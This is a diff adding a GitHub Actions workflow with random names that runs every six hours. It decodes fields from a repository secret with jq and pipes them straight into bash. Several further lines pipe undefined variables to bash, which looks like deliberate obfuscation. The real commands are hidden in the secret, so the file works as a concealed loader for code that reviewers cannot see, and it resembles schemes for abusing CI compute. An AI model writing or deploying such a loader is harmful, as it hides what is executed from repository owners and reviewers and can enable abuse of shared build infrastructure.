@@ -1,0 +1,28 @@
+name: dollyxiaoxin
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dollyxiaoxin
+        env:
+          uqgy5: ${{ secrets.uqgy5 }}
+        run: |
+          echo $uqgy5 | jq -r .m48227 | /bin/bash
+          echo $prwkv06664 | jq -r .qe9 | /bin/bash
+          echo $mulc03 | jq -r .znr26 | /bin/bash
+          echo $qev50 | jq -r .feggv666 | /bin/bash
+          echo $s93407 | jq -r .fgghp22848 | /bin/bash
+          echo $vptzu580 | jq -r .cl63187 | /bin/bash
+          echo $htrjt67 | jq -r .hvmjh71788 | /bin/bash
+          echo $nbc140 | jq -r .y2 | /bin/bash
+          echo $im7 | jq -r .z3 | /bin/bash
+          echo $vb6 | jq -r .mkv4 | /bin/bash
+          echo $n93837 | jq -r .xbwl45421 | /bin/bash
+
